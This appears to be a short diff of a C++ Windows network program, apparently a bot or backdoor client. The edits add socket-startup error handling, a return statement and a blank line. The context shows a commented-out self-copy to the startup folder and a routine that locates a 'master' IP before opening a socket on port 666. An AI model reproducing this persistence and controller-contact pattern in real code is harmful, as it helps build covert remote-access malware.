@@ -28,10 +28,13 @@ int main(int argc, char** argv)
     {
         copyToStartUp(argv[0]);
         executeStartUpFile();
+        return 0;
     }*/
 
     WSADATA wsaData;
-    WSAStartup(MAKEWORD(2, 2), &wsaData);
+    if(WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
+        std::cout << "StartUp error <" << WSAGetLastError() << ">" << std::endl;
+    
     sockaddr_in addressinfo;
     uint32_t mastersIP = findMastersIP();
     int opt;
@@ -42,6 +45,7 @@ int main(int argc, char** argv)
     addressinfo.sin_addr.s_addr = getPrivateIP();
     addressinfo.sin_port = htons(666);
     addressinfo.sin_family = AF_INET;
+
 
     SOCKET s = socket(AF_INET, SOCK_STREAM, 0);
     if(s < 0)
